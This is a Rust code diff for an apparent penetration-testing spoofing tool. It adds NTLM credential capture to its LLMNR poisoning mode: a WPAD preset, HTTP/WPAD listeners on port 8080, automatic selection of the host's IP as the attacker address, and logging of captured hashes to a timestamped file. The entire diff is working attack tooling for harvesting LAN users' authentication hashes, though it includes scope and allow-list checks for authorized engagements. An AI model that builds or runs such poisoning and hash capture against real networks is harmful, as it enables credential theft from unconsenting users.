@@ -242,8 +242,8 @@ pub enum Cmd {
 
     /// Run an authoritative mDNS or SSDP responder against the given TOML answer table.
     Spoof {
-        /// Path to a TOML answer table. Optional when --template is given.
-        #[arg(value_name = "TABLE", required_unless_present = "template")]
+        /// Path to a TOML answer table. Optional when --template or --preset is given.
+        #[arg(value_name = "TABLE", required_unless_present_any = ["template", "preset"])]
         table: Option<std::path::PathBuf>,
 
         /// Built-in service template. Requires --name and --ip. mDNS-only.
@@ -306,6 +306,25 @@ pub enum Cmd {
         /// Mutually exclusive with --allow / --allow-instance which are allow-list semantics.
         #[arg(long, requires = "llmnr", conflicts_with_all = ["allow", "allow_instance"])]
         wildcard: bool,
+
+        /// Enable credential capture listeners. Comma-separated: http, wpad.
+        #[arg(long, value_delimiter = ',', requires = "llmnr")]
+        credcap: Vec<String>,
+
+        /// Output path for captured hashes. Defaults to credcap-{ISO8601-Z}.hashes
+        /// in cwd or `scope.log_dir`.
+        #[arg(long, requires = "llmnr", value_name = "PATH")]
+        credcap_out: Option<std::path::PathBuf>,
+
+        /// Apply a built-in preset. v1: wpad. Implies --credcap wpad,http and
+        /// pre-loads the WPAD answer table.
+        #[arg(long, requires = "llmnr", value_name = "NAME")]
+        preset: Option<String>,
+
+        /// Engagement domain for preset placeholder substitution. Falls back
+        /// to `scope.engagement_domain`.
+        #[arg(long, requires = "llmnr", value_name = "DOMAIN")]
+        domain: Option<String>,
     },
 
     /// Capture a real LAN device and emit a TOML answer table mimicking it.
@@ -624,12 +643,26 @@ pub async fn run(cli: Cli) -> anyhow::Result<()> {
             http_host,
             llmnr,
             wildcard,
+            credcap,
+            credcap_out,
+            preset,
+            domain,
         } => {
             if llmnr {
-                let table_path =
-                    table.context("--llmnr spoof requires a TABLE positional argument")?;
-                run_llmnr_spoof(&table_path, allow, allow_instance, wildcard, timeout, scope)
-                    .await?;
+                run_llmnr_spoof(
+                    table.as_deref(),
+                    allow,
+                    allow_instance,
+                    wildcard,
+                    timeout,
+                    credcap,
+                    credcap_out,
+                    preset,
+                    domain,
+                    scope,
+                    &cli.interface,
+                )
+                .await?;
             } else if ssdp {
                 let table_path =
                     table.context("--ssdp spoof requires a TABLE positional argument")?;
@@ -1354,20 +1387,58 @@ async fn run_ssdp_spoof(
     clippy::too_many_arguments,
     reason = "all args map 1:1 to CLI flags; splitting into a struct would obscure the relationship"
 )]
+#[allow(
+    clippy::too_many_lines,
+    reason = "orchestrates table build, auth, credcap listeners, and LLMNR responder in one place"
+)]
+#[allow(
+    clippy::cognitive_complexity,
+    reason = "linear setup for multiple optional subsystems; extracting helpers would obscure flow"
+)]
 async fn run_llmnr_spoof(
-    table_path: &std::path::Path,
+    table_path: Option<&std::path::Path>,
     allow_subnet: Vec<IpNet>,
     allow_instance: Vec<String>,
     wildcard: bool,
     timeout: u64,
+    credcap: Vec<String>,
+    credcap_out: Option<std::path::PathBuf>,
+    preset: Option<String>,
+    domain: Option<String>,
     scope: Option<crate::scope::Scope>,
+    iface_filter: &[String],
 ) -> anyhow::Result<()> {
-    let raw = std::fs::read_to_string(table_path)
-        .with_context(|| format!("reading LLMNR answer table {}", table_path.display()))?;
-    let table =
-        crate::name_res::table::AnswerTable::from_toml(&raw).map_err(|e| anyhow::anyhow!("{e}"))?;
+    // --- Build the answer table ---
+    let mut table = if let Some(preset_str) = preset.as_deref() {
+        let p = preset_str
+            .parse::<crate::name_res::preset::Preset>()
+            .map_err(|e| anyhow::anyhow!("{e}"))?;
+        let attacker_ip: std::net::IpAddr = primary_local_ipv4(iface_filter)?.into();
+        let engagement_domain = domain
+            .as_deref()
+            .or_else(|| scope.as_ref().and_then(|s| s.engagement_domain.as_deref()));
+        crate::name_res::preset::build(p, attacker_ip, engagement_domain)
+    } else if let Some(path) = table_path {
+        let raw = std::fs::read_to_string(path)
+            .with_context(|| format!("reading LLMNR answer table {}", path.display()))?;
+        crate::name_res::table::AnswerTable::from_toml(&raw).map_err(|e| anyhow::anyhow!("{e}"))?
+    } else {
+        anyhow::bail!("--llmnr spoof needs a TOML table or --preset");
+    };
 
-    let mut auth = match scope {
+    // Layer optional TOML on top of a preset.
+    if preset.is_some()
+        && let Some(path) = table_path
+    {
+        let raw = std::fs::read_to_string(path)
+            .with_context(|| format!("reading LLMNR answer table {}", path.display()))?;
+        let extra = crate::name_res::table::AnswerTable::from_toml(&raw)
+            .map_err(|e| anyhow::anyhow!("{e}"))?;
+        table.names.extend(extra.names);
+    }
+
+    // --- Auth ---
+    let mut auth = match scope.clone() {
         Some(s) => s.into_auth(allow_subnet, Vec::new()),
         None => allow_subnet
             .into_iter()
@@ -1380,6 +1451,123 @@ async fn run_llmnr_spoof(
         auth.warn_once_if_permissive("spoof_llmnr");
     }
 
+    // --- Credcap flavors ---
+    let mut flavors = credcap
+        .iter()
+        .map(|s| s.to_ascii_lowercase())
+        .collect::<std::collections::BTreeSet<_>>();
+    if preset.as_deref().map(str::to_ascii_lowercase).as_deref() == Some("wpad") {
+        flavors.insert("wpad".into());
+        flavors.insert("http".into());
+    }
+
+    // --- Hash output file and listeners ---
+    let cancel = tokio_util::sync::CancellationToken::new();
+    let mut credcap_tasks = Vec::new();
+
+    if !flavors.is_empty() {
+        let out_path = credcap_out.unwrap_or_else(|| {
+            let filename = default_credcap_filename();
+            let base = scope
+                .as_ref()
+                .and_then(crate::scope::Scope::log_dir)
+                .map_or_else(
+                    || std::env::current_dir().unwrap_or_default(),
+                    std::path::Path::to_path_buf,
+                );
+            base.join(filename)
+        });
+
+        if let Some(parent) = out_path.parent() {
+            std::fs::create_dir_all(parent).ok();
+        }
+        let file = std::fs::OpenOptions::new()
+            .append(true)
+            .create(true)
+            .open(&out_path)
+            .with_context(|| format!("opening credcap output {}", out_path.display()))?;
+        tracing::info!(path = %out_path.display(), "credcap hashes will be written here");
+        let file_arc = std::sync::Arc::new(std::sync::Mutex::new(file));
+
+        let make_sink = {
+            let arc = file_arc.clone();
+            move || {
+                let arc = arc.clone();
+                let sink: crate::credcap::HashSink =
+                    std::sync::Arc::new(
+                        move |line: String| -> std::pin::Pin<
+                            Box<dyn std::future::Future<Output = ()> + Send>,
+                        > {
+                            let arc = arc.clone();
+                            Box::pin(async move {
+                                use std::io::Write as _;
+                                if let Ok(mut f) = arc.lock() {
+                                    drop(writeln!(f, "{line}"));
+                                }
+                            })
+                        },
+                    );
+                sink
+            }
+        };
+
+        // Validate flavors before binding.
+        if flavors.contains("smb") {
+            anyhow::bail!(
+                "credcap smb is deferred to a future plan; pass --credcap http,wpad for now"
+            );
+        }
+        for flavor in &flavors {
+            if flavor != "http" && flavor != "wpad" {
+                anyhow::bail!("unknown credcap flavor: {flavor}; supported: http, wpad");
+            }
+        }
+
+        // When both wpad and http are requested, wpad wins (it handles NTLM + PAC).
+        if flavors.contains("wpad") {
+            if flavors.contains("http") {
+                tracing::info!(
+                    "both wpad and http credcap requested; running WpadListener on :8080 (handles both)"
+                );
+            }
+            let attacker_ip = primary_local_ipv4(iface_filter)?.to_string();
+            tracing::warn!(
+                "WPAD credcap listening on :8080; production WPAD attacks expect :80 \
+                 -- re-bind with sudo or firewall redirect"
+            );
+            let listener = crate::credcap::WpadListener::bind("0.0.0.0:8080", attacker_ip, 8080, {
+                let sink = make_sink();
+                move |line: String| {
+                    let sink = sink.clone();
+                    async move { sink(line).await }
+                }
+            })
+            .await
+            .map_err(|e| anyhow::anyhow!("{e}"))?;
+            tracing::info!(addr = %listener.local_addr(), "wpad credcap listener bound");
+            let c = cancel.clone();
+            credcap_tasks.push(tokio::spawn(async move { listener.run(c).await }));
+        } else if flavors.contains("http") {
+            tracing::warn!(
+                "HTTP credcap listening on :8080; production WPAD attacks expect :80 \
+                 -- re-bind with sudo or firewall redirect"
+            );
+            let listener = crate::credcap::HttpListener::bind("0.0.0.0:8080", {
+                let sink = make_sink();
+                move |line: String| {
+                    let sink = sink.clone();
+                    async move { sink(line).await }
+                }
+            })
+            .await
+            .map_err(|e| anyhow::anyhow!("{e}"))?;
+            tracing::info!(addr = %listener.local_addr(), "http credcap listener bound");
+            let c = cancel.clone();
+            credcap_tasks.push(tokio::spawn(async move { listener.run(c).await }));
+        }
+    }
+
+    // --- LLMNR responder ---
     let responder = crate::name_res::llmnr::Responder::new(
         crate::name_res::llmnr::llmnr_mode(),
         table,
@@ -1388,7 +1576,6 @@ async fn run_llmnr_spoof(
     )
     .map_err(|e| anyhow::anyhow!("{e}"))?;
 
-    let cancel = tokio_util::sync::CancellationToken::new();
     let task = tokio::spawn({
         let cancel = cancel.clone();
         async move { responder.run(cancel).await }
@@ -1400,6 +1587,10 @@ async fn run_llmnr_spoof(
         () = wait_for_window(timeout) => None,
     };
     cancel.cancel();
+    // Wait briefly for credcap tasks to shut down.
+    for t in credcap_tasks {
+        drop(tokio::time::timeout(std::time::Duration::from_millis(500), t).await);
+    }
     match outcome {
         Some(Ok(Err(e))) => Err(anyhow::anyhow!("{e}")),
         Some(Err(e)) => Err(anyhow::anyhow!("llmnr responder task panicked: {e}")),
@@ -1425,6 +1616,39 @@ fn derive_local_v4_ip() -> anyhow::Result<Ipv4Addr> {
         }
     }
     anyhow::bail!("no non-loopback IPv4 interface found")
+}
+
+fn primary_local_ipv4(iface_filter: &[String]) -> anyhow::Result<Ipv4Addr> {
+    let ifaces = get_if_addrs::get_if_addrs().context("listing interfaces")?;
+    for iface in ifaces {
+        if iface.is_loopback() {
+            continue;
+        }
+        if !iface_filter.is_empty() && !iface_filter.iter().any(|n| n == &iface.name) {
+            continue;
+        }
+        if let std::net::IpAddr::V4(addr) = iface.ip() {
+            return Ok(addr);
+        }
+    }
+    anyhow::bail!("no non-loopback IPv4 interface found")
+}
+
+fn default_credcap_filename() -> String {
+    let now = SystemTime::now();
+    let dur = now.duration_since(UNIX_EPOCH).unwrap_or_default();
+    let secs = dur.as_secs();
+    let when = time::OffsetDateTime::from_unix_timestamp(i64::try_from(secs).unwrap_or(0))
+        .unwrap_or(time::OffsetDateTime::UNIX_EPOCH);
+    format!(
+        "credcap-{:04}-{:02}-{:02}T{:02}-{:02}-{:02}Z.hashes",
+        when.year(),
+        u8::from(when.month()),
+        when.day(),
+        when.hour(),
+        when.minute(),
+        when.second()
+    )
 }
 
 async fn run_spoof_monitor(
